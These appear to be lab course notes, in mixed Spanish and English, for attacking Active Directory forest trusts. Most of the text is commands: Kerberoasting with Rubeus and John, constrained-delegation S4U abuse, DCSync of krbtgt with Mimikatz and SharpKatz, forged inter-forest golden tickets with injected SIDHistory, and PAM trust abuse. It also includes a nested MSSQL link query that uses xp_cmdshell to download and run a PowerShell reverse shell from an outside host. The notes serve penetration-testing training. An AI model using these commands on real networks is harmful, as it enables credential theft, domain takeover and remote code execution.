# Cross Forest Attacks

- Ahora tenemos privilegios de administrador empresarial en el bosque techcorp.local.
- Analicemos algunas técnicas para moverse a través de los forest trusts

**Cross Forest Attacks - Kerberoast**

- Es posible ejecutar Kerberoast en confianzas forestales.
- Vamos a enumerar las cuentas de servicio con nombre en las confianzas forestales
- Usando PowerView:

    `Get-DomainTrust | ?{$_.TrustAttributes -eq
    'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain
    $_.TargetName}`

- ActiveDirectory Module:

    `Get-ADTrust -Filter 'IntraForest -ne $true' | %{GetADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}`

- Request a TGS:

    `C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:euhashes.txt`

- Check for the TGS:

    `klist`

- Crack using John:

    `john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt`

- Request TGS across trust using PowerShell:

    `Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/eu-file.eu.local@eu.local`

**Privilege Escalation – Constrained Delegation with Protocol Transition**

- La delegación restringida clásica no funciona en confianzas forestales.
- Pero podemos abusar de él una vez que tengamos un punto de apoyo a través de la confianza forestal.

Using PowerView:

`Get-DomainUser –TrustedToAuth -Domain eu.local`

`Get-DomainComputer –TrustedToAuth -Domain eu.local`

Using ActiveDirectory module:

`Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local`

Podemos solicitar un billete alternativo utilizando Rubeus:

`C:\AD\Tools\Rubeus.exe hash /password:August@2019
/user:storagesvc /domain:eu.local`

`C:\AD\Tools\Rubeus.exe s4u /user:storagesvc
/rc4:068A0A7194F8884732E4F5A7CB47E17C
/impersonateuser:Administrator /domain:eu.local
/msdsspn:nmagent/eu-dc.eu.local /altservice:ldap /dc:eudc.eu.local /ptt`

Abuse the TGS to LDAP:

`Invoke-Mimikatz -Command '"lsadump::dcsync /user:eu\krbtgt /domain:eu.local"'`

Or:

`C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\krbtgt --Domain eu.local --DomainController eu-dc.eu.local`

**Cross Forest Attacks - Unconstrained Delegation**

- Recuerde el error de la impresora y su abuso de una máquina con delegación sin restricciones.
- Lo hemos utilizado para escalar privilegios a Administrador de dominio y Administrador de empresa.
- ¡También funciona en una confianza de bosque bidireccional con la delegación TGT habilitada!
- La delegación TGT está deshabilitada de forma predeterminada y debe habilitarse explícitamente a través de una confianza para el bosque de confianza (destino).
- En el laboratorio, TGTDelegation se establece de usvendor.local a techcorp.local
(pero no configurado para la otra dirección).

Para enumerar si TGTDelegation está habilitado en una confianza de bosque, ejecute el siguiente comando desde un DC:

`netdom trust trustingforest /domain:trustedforest
/EnableTgtDelegation`

En el laboratorio, esto se ejecutará en usvendor-dc:

`netdom trust usvendor.local /domain:techcorp.local
/EnableTgtDelegation`

Los cmdlets de PowerShell de ADModule parecen tener un error, el siguiente comando muestra TGTDelegation establecido en False:

`Get-ADTrust -server usvendor.local -Filter *`

Pero cuando se ejecuta desde usvendor-dc, muestra que TGTDelegation es True.

**Cross Forest Attacks - Trust Key**

- Al abusar del flujo de confianza entre los bosques en una confianza bidireccional, es posible acceder a los recursos a través de los límites del bosque.
- Podemos usar la clave de confianza, de la misma manera que en los Domain Trusts , pero podemos acceder solo a los recursos que se comparten explícitamente con nuestro bosque actual.
- Intentemos acceder a un recurso compartido de archivos 'eushare' en euvendor-dc del bosque euvendor.local desde eu.local que se comparte explícitamente con Administradores de dominio de eu.local.
- Tenga en cuenta que estamos saltando confianzas de us.techcrop.local a eu.local a euvendor.local.
- Al igual que en el escenario dentro de un bosque, necesitamos la clave de confianza para la confianza entre bosques.

    `Invoke-Mimikatz -Command '"lsadump::trust /patch"'`

    Or:

    `Invoke-Mimikatz -Command '"lsadump::dcsync
    /user:eu\euvendor$"'`

- Se puede forjar un TGT entre bosques:

    `Invoke-Mimikatz -Command '"kerberos::golden 
    /user:Administrator /domain:eu.local /sid:S-1-5-21-
    3657428294-2017276338-1274645009 
    /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 
    /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi"'`

- Obtenga un TGS para un servicio (CIFS a continuación) en el bosque de destino mediante el vale de confianza falsificado.

    `.\asktgs.exe C:\AD\Tools\kekeo_old\sharedwitheu.kirbi CIFS/euvendor`

- También se pueden crear tickets para otros servicios (como HOST y RPCSS para WMI, HOST y HTTP para PowerShell Remoting y WinRM):
- Utilice el TGS para acceder al recurso de destino que debe compartirse explícitamente:

    `.\kirbikator.exe lsa CIFS.euvendor-dc.euvendor.local.kirbi`

    `ls \\euvendor-dc.euvendor.local\eushare\`

- Con Rubeus:

    `C:\Users\Public\Rubeus.exe asktgs
    /ticket:C:\Users\Public\sharedwitheu.kirbi
    /service:CIFS/euvendor-dc.euvendor.local /dc:euvendordc.euvendor.local /ptt`

- Esto está bien, pero ¿por qué no podemos acceder a todos los recursos como Intra Forest?
- El filtrado SID es la respuesta. Filtra los SID de alto privilegio del SIDHistory de un TGT que cruza el límite del bosque. Esto significa que no podemos simplemente seguir adelante y acceder a los recursos en el bosque de confianza como administradores de empresa.
- Pero hay una trampa:

    ![Cross%20Forest%20Attacks%2076dc085b3f9b46cdb291455124819d5c/Untitled.png](images/Cross%20Forest%20Attacks/Untitled.png)

    Esto significa que, si tenemos una confianza externa (o una confianza de bosque con el historial de SID habilitado,/ enabledidhistory: sí), podemos inyectar un SIDHistory para RID> 1000 para acceder a los recursos accesibles a esa identidad o grupo en el bosque de confianza de destino.

- Tuvimos acceso DA a eu.local. Enumeremos los fideicomisos de una sesión de PSRemting en eu-dc:

    `Get-ADTrust -Filter *`

- SIDFilteringForestAware se establece en True, lo que significa que SIDHistory está habilitado en la confianza del bosque.
- Recuerde que todavía solo se permitirán RID> 1000 SID a través del límite de confianza.

    `Get-ADGroup -Identity EUAdmins -Server euvendor.local`

- Desde eu-dc, cree un TGT con SIDHistory del grupo EUAdmins:

    `Invoke-Mimikatz -Command '"kerberos::golden 
    /user:Administrator /domain:eu.local /sid:S-1-5-21-
    3657428294-2017276338-1274645009 
    /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt
    /target:euvendor.local /sids:S-1-5-21-4066061358-
    3942393892-617142613-1103 
    /ticket:C:\Users\Public\euvendornet.kirbi"'`

Request a TGS:

`.\asktgs.exe C:\Users\Public\euvendornet.kirbi HTTP/euvendor-net.euvendor.local`

Inject that into current session:

`.\kirbikator.exe lsa HTTP.euvendor-net.euvendor.local.kirbi`

Acceda a la máquina euvendor-net usando PSRemoting:

`Invoke-Command -ScriptBlock{whoami} -ComputerName euvendornet.euvendor.local -Authentication NegotiateWithImplicitCredential`

**Trust Abuse - MSSQL Servers**

- Los servidores MS SQL generalmente se implementan en abundancia en un dominio de Windows.
- Los servidores SQL brindan muy buenas opciones para el movimiento lateral, ya que permiten mapear usuarios de dominio a roles de base de datos y así convertirse en parte de
AD trusts.
- Veamos un escenario en el que podemos abusar de la confianza de los servidores SQL y de los enlaces de bases de datos para traspasar los límites de la confianza del bosque.
- Para piratería informática de MSSQL y PowerShell, usemos PowerUpSQL

    [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

Discovery (SPN Scanning):

`Get-SQLInstanceDomain`

Check Accessibility

`Get-SQLConnectionTestThreaded`

`Get-SQLInstanceDomain | Get SQLConnectionTestThreaded -
Verbose`

Recopilar información

`Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`

**Trust Abuse - MSSQL Servers - Database Links**

- Un enlace de base de datos permite que un servidor SQL acceda a fuentes de datos externas como otros servidores SQL y fuentes de datos OLE DB.
- En el caso de enlaces de bases de datos entre servidores SQL, es decir, servidores SQL enlazados, es posible ejecutar procedimientos almacenados.
- Los enlaces de bases de datos funcionan incluso en trusts forestales.

Searching Database Links

Look for links to remote servers

`Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose`

We can manually enumerate linked servers

`select * from master..sysservers`

La función Openquery se puede utilizar para ejecutar consultas en una base de datos vinculada

`select * from openquery("192.168.23.25",'select * from master..sysservers')`

Las consultas de Openquery se pueden encadenar para acceder a enlaces dentro de enlaces (enlaces anidados)

`select * from openquery("192.168.23.25 ",'select * from openquery("db-sqlsrv",''select @@version as version'')')`

Executing Commands

En el servidor de destino, xp_cmdshell ya debería estar habilitado, Si rpcout está habilitado (deshabilitado de forma predeterminada), xp_cmdshell se puede habilitar usando:

`EXECUTE('sp_configure''xp_cmdshell'',1;reconfigure;') AT "db-sqlsrv"`

Desde el servidor SQL inicial, los comandos del sistema operativo se pueden ejecutar mediante consultas de enlace anidadas:

`select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')`

Abusing Database Links

Rastrear enlaces a servidores remotos

`Get-SQLServerLinkCrawl -Instance usmssql.us.techcorp.local`

Abusar de enlaces a servidores remotos (intenta usar xp_cmdshell en cada eslabón de la cadena):

`Get-SQLServerLinkCrawl -Instance usmssql.us.techcorp.local -Query 'exec master..xp_cmdshell ''whoami'''`

**Cross Forest Attacks - Foreign Security Principals**

- Una entidad de seguridad externa (FSP) representa una entidad de seguridad en un trust de bosque externo o identidades especiales (como usuarios autenticados, CD de empresas, etc.).
- Solo el SID de un FSP se almacena en el contenedor principal de seguridad externa que se puede resolver mediante la relación de confianza.
- FSP permite que los principales externos se agreguen a los grupos de seguridad locales del dominio. Por lo tanto, permitir que dichos directores accedan a los recursos del bosque.
- A menudo, los proveedores de servicios financieros se ignoran, están mal configurados o son demasiado complejos para cambiarlos o limpiarlos en una empresa, lo que los hace propicios para el abuso.
- Enumeremos los FSP para el dominio db.local usando el shell inverso que tenemos allí.
• PowerView:
`Find-ForeignGroup -Verbose
Find-ForeignUser -Verbose`
• Utilizando el módulo ActiveDirectory:
`Get-ADObject -Filter {objectClass -eq "ForeignSecurityPrincipal"}`

**Cross Forest Attacks - ACLs**

- El acceso a los recursos en un trust forestal también se puede proporcionar sin utilizar FSP que utilicen ACL.
- Los principales agregados a las ACL NO aparecen en el contenedor ForeignSecurityPrinicpals, ya que el contenedor se llena solo cuando se agrega un principal a un grupo de seguridad local de dominio.
- Enumeremos las ACL para el dominio dbvendor.local usando el shell inverso que tenemos en db.local:
`Find-InterestingDomainAcl -Domain dbvendor.loca`

**Cross Forest Attacks - Abusing PAM Trust**

- La confianza de PAM generalmente está habilitada entre un bosque Bastión o Rojo y un bosque de producción / usuario que administra.
- La confianza de PAM proporciona la capacidad de acceder al bosque de producción con privilegios elevados sin utilizar las credenciales del bosque bastión. Por lo tanto, mayor seguridad para el bosque bastión que tanto se desea.
- Para lograr lo anterior, los directores de sombra se crean en el dominio bastión que luego se asignan a los SID de los grupos DA o EA en el bosque de producción.
- Tenemos acceso DA al bosque local techcorp. Al enumerar trusts y buscar acceso, podemos enumerar que tenemos acceso administrativo al bosque bastion.local.
- Desde techcorp-dc:

    `Get-ADTrust -Filter *`

    `Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local`

- En bastion-dc, enumeramos si hay algun PAM Trust:

    `$bastiondc = New-PSSession bastion-dc.bastion.local Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}} -Session $bastiondc`

- Checkeamos los usuario miembro del Shadow Principal:

    `Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," +(GetADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc`

- Establecemos un PSRemoting directo con la sesion en bsation-dc y accedemos a production.local:

    `Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential`